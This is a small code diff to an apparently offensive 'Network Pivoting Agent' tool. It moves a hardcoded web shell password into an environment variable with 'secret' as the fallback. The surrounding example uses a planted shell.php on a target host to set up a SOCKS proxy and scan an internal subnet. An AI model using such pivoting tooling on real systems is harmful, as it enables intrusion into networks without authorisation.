@@ -6,10 +6,14 @@ Network Pivoting Agent
 import asyncio
 import socket
 import struct
+import os
 from typing import Dict, List, Optional
 import logging
 
 log = logging.getLogger(__name__)
+
+# Get default shell password from environment variable
+DEFAULT_SHELL_PASSWORD = os.getenv('SHELL_PASSWORD', 'secret')
 
 
 class NetworkPivot:
@@ -635,7 +639,7 @@ if __name__ == "__main__":
         # Create SOCKS proxy
         result = await pivot.create_socks_proxy(
             shell_url="http://target.com/shell.php",
-            shell_password="secret",
+            shell_password=DEFAULT_SHELL_PASSWORD,
             local_port=1080
         )
         
@@ -644,7 +648,7 @@ if __name__ == "__main__":
         # Scan internal network
         scan_result = await pivot.scan_internal_network(
             shell_url="http://target.com/shell.php",
-            shell_password="secret",
+            shell_password=DEFAULT_SHELL_PASSWORD,
             network="192.168.1.0/24"
         )
         
